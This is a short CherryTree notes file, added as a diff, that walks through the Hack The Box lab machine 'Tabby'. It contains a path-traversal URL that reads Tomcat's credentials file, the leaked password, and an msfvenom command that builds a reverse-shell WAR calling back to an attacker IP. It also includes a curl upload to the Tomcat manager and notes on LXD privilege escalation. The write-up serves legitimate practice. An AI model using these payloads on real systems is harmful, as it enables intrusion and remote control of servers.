@@ -1,0 +1,41 @@
+<?xml version="1.0" ?>
+<cherrytree>
+	<node custom_icon_id="0" foreground="" is_bold="False" name="tabby" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1594938409.53" ts_lastsave="1594957186.28" unique_id="1">
+		<rich_text>tomcat version: 9.0.31
+
+
+port 80 gave: superhosting.htb (different domain), and the </rich_text>
+		<rich_text style="italic" weight="heavy">news </rich_text>
+		<rich_text>tab possibly gave a LFI so i tried changing the domain to tabby.htb, and LFI worked.
+
+hints on xml file was on port 8080 index page
+
+</rich_text>
+		<rich_text link="webs http://tabby.htb/news.php?file=../../../../../usr/share/tomcat9/etc/tomcat-users.xml">http://tabby.htb/news.php?file=../../../../../usr/share/tomcat9/etc/tomcat-users.xml</rich_text>
+		<rich_text>
+
+
+username=&quot;tomcat&quot; 
+password=&quot;$3cureP4s5w0rd123!&quot;
+
+tomcat9 vulnerable to war upload
+
+generate payload:
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.153 LPORT=4444 -f war &gt; shell.war
+ 
+upload: curl -u ‘tomcat’:'$3cureP4s5w0rd123!' -T shell.war </rich_text>
+		<rich_text link="webs http://10.10.10.194:8080/manager/text/deploy?path=/myshell">http://10.10.10.194:8080/manager/text/deploy?path=/myshell</rich_text>
+		<rich_text>
+
+crack the backupfile.zip found in /var/www/html/files
+
+password: admin@it
+
+use this password to switch to user ash
+
+lxd priv esc to root
+
+</rich_text>
+		<rich_text link="webs https://ethicalhackingguru.com/the-lxd-privilege-escalation-tutorial-how-to-exploit-lxd/">https://ethicalhackingguru.com/the-lxd-privilege-escalation-tutorial-how-to-exploit-lxd/</rich_text>
+	</node>
+</cherrytree>
